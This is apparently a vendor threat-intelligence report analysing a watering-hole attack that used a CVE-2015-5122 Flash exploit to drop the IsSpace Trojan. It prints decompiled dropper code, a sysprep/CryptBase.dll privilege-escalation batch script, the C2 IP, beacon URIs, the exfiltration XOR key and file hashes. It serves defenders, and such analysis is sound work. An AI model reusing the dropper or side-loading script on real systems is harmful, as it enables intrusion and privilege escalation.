The website was compromised to launch an\napparent watering-hole attack against the company's customers. It was hosting an Adobe Flash\nexploit targeting one of the newly disclosed vulnerabilities from the Hacking Team data breach, CVE2015-5122.\n\nThis attack yet again showcases the opportunistic tendencies of adversary groups and bad actors.\nThe malware deployed by this exploit has been seen in a number of targeted attacks and provides\nattackers with a foothold on the victim’s machine and/or network.\n\n[The exploit file, movie.swf, was ZWS compressed, a tactic that has been observed to evade anti-](http://blog.malwaretracker.com/2014/01/cve-2013-5331-evaded-av-by-using.html)\nvirus programs. Once uncompressed, a binary was found to be embedded in the Flash file. Upon\nfurther analysis, this file was found to contain behavior consistent with a Trojan commonly called\n[IsSpace. Based on its codebase and behavioral patterns, it appears that IsSpace could possibly be](https://publicintelligence.net/fbi-hack-tools-opm/)\n[an evolution of the NFlog backdoor, which has previously been attributed to the adversary groups](https://blog.paloaltonetworks.com/2015/04/unit-42-identifies-new-dragonok-backdoor-malware-deployed-against-japanese-targets/)\nDragonOK and Moafee. Both groups are thought to be operating out of Southeast Asia, and Moafee\n[in particular has been associated with attacks on the US defense industrial base.](https://www.fireeye.com/resources/pdfs/white-papers/fireeye-operation-quantum-entanglement.pdf)\n\n## Exploit Details\n\nThe CVE-2015-5122 exploit found within the Flash file is nearly identical to the original proof of\n[concept (POC) disclosed publically from the Hacking Team data breach. An analysis by Trend Micro](http://blog.trendmicro.com/trendlabs-security-intelligence/another-zero-day-vulnerability-arises-from-hacking-team-data-leak/)\ncovers the POC in detail. Unlike the POC mentioned in the Trend Micro report, this particular exploit\nfile was weaponized, and, instead of loading calc.exe, a much more malicious file was loaded. As\nseen in Figure 1, the embedded shellcode is obfuscated using the same technique of representing\nbytes as integers and exponential numbers. However it appears that the adversary did not modify\nthe POC much, as the variable name ‘calc’ remains unchanged.\n\n\n-----\n\nFigure 1. Embedded shellcode within the malicious Flash file\n\nThese values can be converted into their byte representations using a simple Python script,\ntruncated here for brevity.\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n>>> import struct\n>>> shellcode =\n\n[2.179763029E9,286956,2.425377536E9,2.2444484E9,4.29496648E9,1094795585]\n>>> for s in shellcode:\n...   print repr(struct.pack(\"I\", s))\n...\n'U\\x8b\\xec\\x81'\n'\\xec`\\x04\\x00'\n'\\x00S\\x90\\x90'\n'\\x90\\x90\\xc7\\x85'\n'\\xd0\\xfc\\xff\\xff'\n'AAAA'\n\n\nLooking at the shellcode in further detail shows a fairly simplistic instruction set. Functions are\nloaded dynamically, and a file is dropped to %TEMP%\\Rdws.exe before being executed using the\nWinExec Windows API call.\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\nsz_file_path = GetTempPathA(256, file_path);\nv6 = file_path;\nv7 = sz_file_path;\n*&file_path[sz_file_path] = 'swdR';\n*&v6[v7 + 4] = 'exe.';\n*&v6[v7 + 8] = 0;\nfile_handle = CreateFileA(file_path, 0x40000000, 0, 0, 2, 0, 0);\nif ( file_handle != -1 )\n{\nWriteFile(file_handle, data, v41, &v110, 0);\nCloseHandle(file_handle);\nWinExec(file_path, 0);\n}\n\n\n-----\n\nReturning to the Flash exploit, we discover that the dropped file is embedded within the Flash file\nitself as ByteArray. This binary data is loaded and decompressed with ZLIB prior to being stored in a\nnewly allocated section of memory. The address of this binary data is then stored in the shellcode\nbefore it is executed.\n\nFigure 2. Exploit loading binary and running shellcode\n\nAfter successful execution, a binary with the following attributes is executed on the victim’s machine.\n\nMD5 319500B2C792AEE6CD8EF8EE87D9DC1E\n\nSHA1 723DB4F13E98364098D76B925EA197F9ECD5309B\n\nSHA256 27439ADAA07F5AD16EB8039C16ECEB4E71F6358E7FC13AC645E8878DA8C3E77E\n\nSize 59904 Bytes\n\nFile Type PE32 executable (GUI) Intel 80386, for MS Windows\n\n\nCompile\nTimestamp\n\n\n2014-11-14 04:35:13 UTC\n\n\n## Malware Details\n\nAs seen by the compile timestamp, this malware sample is not extremely current. The timestamp\nshows a compile date of November 14, 2014, which indicates that the infrastructure used by this\nparticular sample has remained intact for quite some time, relatively speaking. Analysis of the\nmalware indicates that this sample is highly likely to be the Trojan tool IsSpace, which shares similar\ncode and behaviors as the NFlog tool.\n\n\n-----\n\nWhen comparing IsSpace to NFlog, we noticed a number of changes have been made. When\ninitially run, the malware attempts to write log messages to ‘C:\\ProgramData\\log[.]txt’ indicating that\nthis variant was intended to run on Microsoft Windows 7 or higher. However, it still maintains the\ncapability to run on operating systems earlier than Microsoft Windows 7 if needed. IsSpace creates\nan event named ‘MdQ0784kd’ to ensure that only a single instance of the malware is running at any\ngiven time on an infected host.\n\nTo determine the flow of execution, IsSpace gathers various data about the infected host, such as\nadministrative rights of the user, operating system version, and CPU architecture.\n\nIf IsSpace determines that it is running as an administrator on a Microsoft Windows 7 system on a\n32-bit platform, it will attempt to execute itself accordingly, using a side-loading technique. The\nmalware will drop a cabinet file and batch script to the following locations:\n\n%TEMP%\\FASAP.DAT\n%TEMP%\\FASAPI.bat\n\nThe batch script contains the following:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n@echo off\nping localhost\nstart wusa [%TEMP%]\\FASAP.DAT /quiet /extract:%windir%\\system32\\sysprep\\\nping localhost\nping localhost\nping localhost\nping localhost\nping localhost\nstart %windir%\\system32\\sysprep\\sysprep.exe \"[CWD]\\[Malware].EXE\"\n\n\n\n[CWD] is the directory where the malware was run from and [%TEMP%] is the full path of the\n%TEMP% directory.\n\nThe batch script will first extract the cabinet file to the sysprep directory. The extracted file is a 32-bit\nDLL with the name ‘CryptBase.dll.’ The batch script continues to execute sysprep.exe after\napproximately 5 seconds, which will automatically load the dropped CryptBase.dll file. This DLL will\nexecute the provided argument in a child process. This newly created process has elevated\nprivileges as it is spawned by sysprep.exe.\n\nA similar process is taken for 64-bit systems. However, instead of dropping a batch script, a 64-bit\nexecutable along with a cabinet file containing a 64-bit version of CryptBase.dll is dropped to the\nfollowing path instead:\n\n%TEMP%\\FASAPI.bin\n%TEMP%\\FASAP.DAT\n\nThis executable is then run in a new process. It is responsible for unpacking the cabinet file and\nspawning a new instance of sysprep.exe.\n\n\n-----\n\nIf the malware detects that it is running on a Windows XP host, it will attempt to check for Internet\n[connectivity by making a HTTP request to www.microsoft.com. This is similar to characteristics](http://www.microsoft.com/)\nobserved in the NFlog backdoor, with the primary deviation being that this activity only takes place\nwhen running in a Windows XP environment with IsSpace.\n\nIsSpace proceeds to make HTTP requests to 172.246.109.27, which appears to be its primary\ncommand and control (C2) server. The initial HTTP request is made to ‘//STTip.asp.’ Note the extra\nleading forward slash. This is likely an unfortunate side effect of the malware expecting a\nsubdirectory in the URI path. As this particular sample did not supply one, the extra slash is seen. An\nexample request made can be seen below:\n\nFigure 3. Initial IsSpace beacon being sent\n\nAfter the initial beacon, IsSpace will exfiltrate victim information by making an HTTP request to\n‘//SNews.asp?HostID=xx-xx-xx-xx-xx-xx’, where the HostID contains the victim’s MAC address. The\nPOST data sent in this request is encrypted using the same four-byte XOR key of ‘\\x35\\x8E\\x9D\\x7A’\nthat has been used by the NFlog tool.\n\nFigure 4. IsSpace disseminating victim information and accepting command\n\nThe decrypted information contains data similar to the following:\n\n1 '60-F8-1D-CC-2F-CF#%##%#172.16.95.137#%#WINLJLV2NKIOKP#%#Win7#%#English(US)#%#2015-07-17\n09:31:57#%#Active#%#303_20140401#%#IsAdmins#%#IsSpace'\n\n\n-----\n\nOnce again, the exfiltrated data is very similar to what has been used by NFlog; however with\nIsSpace, the victim’s user privilege level is also included, in addition to a variable of either ‘IsSpace’\nor ‘IsGoogle.’ This particular variable is still under investigation by Unit 42. Additionally, we see what\nis likely a campaign code of ‘303_20140401’.\n\nAfter the successful check-in and initial exfiltration, IsSpace will then accept the following\ncommands:\n\nCommand Description Response URI\n\nCMD Executes command //STravel.asp\n\nBrowse List specified directory //SJobs.asp\n\nUploadFile Upload file //SSports.asp\n\nDownLoad Download file //SWeather.asp\n\nDelFile Delete file N/A\n\nIsSpace provides attackers with a foothold into the victim’s machine and/or network. While the\nmalware itself provides limited functionality, it allows attackers to perform minimal reconnaissance\nand deploy further malware onto the device.\n\n## Infrastructure\n\nFigure 5. Infrastructure related to the command and control IP address\n\nThe IP 172.246.109.27 is hardcoded in the IsSpace sample and is likely to be the primary C2 server.\nPivoting off of this primary C2 IP address using passive DNS data, we located seven domain names\nand two additional IP addresses that may be related to this attack. Three of the domains found used\nthe prefix ‘ssl’ or ‘dns’ as the third level domain; this tactic is commonly used by malware authors as\nan evasion method.\n\nExamining the WHOIS data for the domains revealed additional intelligence on possible attribution.\nSpecifically, the WHOIS data showed the start-vedioing[.]net to be allegedly registered to an entity in\nJapan:\n\nRegistry Registrant ID:\n\nRegistrant Name: Alta Rohde\n\nRegistrant Organization:\n\n\n-----\n\nRegistrant Street: tokoy\nRegistrant Street: tokoy\nRegistrant City: tokoy\nRegistrant State/Province: Aomori\nRegistrant Postal Code: 236521\nRegistrant Country: Japan\nRegistrant Phone: +81.21244215\nRegistrant Phone Ext:\nRegistrant Fax:\nRegistrant Fax Ext:\nRegistrant Email: alta.rohde@inbox[.]com\n\nAnd the anywhere-staring[.]com was found to be allegedly registered to an entity in China:\n\nRegistry Registrant ID:\nRegistrant Name: lan fei\nRegistrant Organization:\nRegistrant Street: tian jing lu 244\nRegistrant City: bei da\nRegistrant State/Province: qing nao\nRegistrant Postal Code: 888000\nRegistrant Country: China\nRegistrant Phone: +86.13877554411\nRegistrant Phone Ext:\nRegistrant Fax:\nRegistrant Fax Ext:\nRegistrant Email: csolyc110@163[.]com\n\nThe geographic regions indicated in the WHOIS data are consistent with campaigns previously\nassociated with NFlog, showing that the adversaries attributed to this malware were highly likely to\nbe operating out of Southeast Asia. IsSpace is a newer variant of the NFlog malware family, and\ncontains many similarities in its behavior and code base. It is highly likely that adversary groups that\nhave historically used NFlog are now using IsSpace.\n\n## Conclusion\n\nAdversaries continue to exploit easily accessible vulnerabilities and readily re-use exploit code and\npayloads, largely due to their efficacy. This type of behavior and activity is expected to continue for\nthe near future due to the multiple vulnerabilities disclosed by the Hacking Team data breach.\n\nAs with many other previously disclosed advanced attacks, relying purely on a detection-based\nmodel for security is ineffective when IOCs are either unknown or are not readily available for\ningestion. Thus, it is imperative that organizations deploy automated, behavior-based preventative\n[measures such as Palo Alto Networks WildFire or](https://www.paloaltonetworks.com/products/technologies/wildfire.html) [Traps to reduce the risk of unknown attacks.](https://blog.paloaltonetworks.com/2015/07/palo-alto-networks-traps-protects-from-latest-flash-zero-day-vulnerability-cve-2015-5119/)\n\nPalo Alto Networks customers using WildFire are protected from this campaign. Additionally, IPS\n[signature 14365 detects IsSpace command and control traffic inside a network.](https://threatvault.paloaltonetworks.com/Home/ThreatDetail/14365)\n\n\n-----\n\n## File Information\n\nName Rdws.exe\n\nMD5 319500B2C792AEE6CD8EF8EE87D9DC1E\n\nSHA1 723DB4F13E98364098D76B925EA197F9ECD5309B\n\nSHA256 27439ADAA07F5AD16EB8039C16ECEB4E71F6358E7FC13AC645E8878DA8C3E77E\n\nSize 59904 Bytes\n\nFile Type PE32 executable (GUI) Intel 80386, for MS Windows\n\n\nCompile\nTimestamp\n\nC2 IP\nAddress\n\n\n2014-11-14 04:35:13 UTC\n\n172.246.109.27\n\n\nName FASAPI.bin\n\nMD5 10DBFB65836773567B466918250D7EF4\n\nSHA1 4330F5AD25980E0EBB0165F6B49727152735EF4A\n\nSHA256 25BA7D0399DDA177A2F35F2F5804BA54A272E43C192649339E5CBF8BD4EFA0E0\n\nSize 9216 Bytes\n\nFile Type PE32+ executable (console) x86-64, for MS Windows\n\n\nCompile\nTimestamp\n\n\n2014-05-06 13:23:38 UTC\n\n\nName FASAP.DAT (64-bit)\n\nMD5 7F1779F37F257006576B2D41919441EC\n\nSHA1 4AC396084E932733BB887B51FA5A5E489D9CB0EC\n\nSHA256 53EDFF51E0E52B2D1E8526FEA144E9EA923183C2CFECE8A87DDA92B8390651AF\n\nSize 4065 Bytes\n\n\nFile\nType\n\n\nMicrosoft Cabinet archive data, 4065 bytes, 1 file\n\n\nName CryptBase.dll (64-bit)\n\nMD5 1F132F365E60CD43FFF75CD3CA464463\n\nSHA1 4DF97974B36ADADFDFDA44172484019AD2EDD649\n\n\n-----\n\nSHA256 BDBD4974F872A6B62528F4F03C64D6CD9CF5E9352582F5AE242DC7F843A6FE55\n\nSize 9216 Bytes\n\nFile Type PE32+ executable (DLL) (GUI) x86-64, for MS Windows\n\n\nCompile\nTimestamp\n\n\n2014-04-21 13:08:07 UTC\n\n\nName FASAP.DAT\n\nMD5 D0D267D8CBBB7DBC59CFC68742FD0559\n\nSHA1 4586685CC724DEDFFB9C41F65B2DFFC7017F2970\n\nSHA256 05ACABAC8BCA04AC36FBD8B7DFBE21BDE720EBE82A6B642721114E7FBDA01BEA\n\nSize 3870 Bytes\n\n\nFile\nType\n\n\nMicrosoft Cabinet archive data, 3870 bytes, 1 file\n\n\nName CryptBase.dll (64-bit)\n\nMD5 BCDEC2A79EADF1DA2166BBB705A25AAE\n\nSHA1 FD2CE90293CBB7CD28B42CE8FFB2CE5D95ED3260\n\nSHA256 052AAD8133E1FFC2863581DB33D366BA4180DFCF2E01ED7ACBEA4D53C355AB59\n\nSize 7680 Bytes\n\nFile Type PE32 executable (DLL) (GUI) Intel 80386, for MS Windows\n\n\nCompile\nTimestamp\n\n\n2014-04-20 12:19:57 UTC\n\n\n**Get updates from**\n\n**Palo Alto**\n\n**Networks!**\n\nSign up to receive the latest news, cyber threat intelligence and research from us\n\n[By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.](https://www.paloaltonetworks.com/legal-notices/terms-of-use)\n\n\n-----",
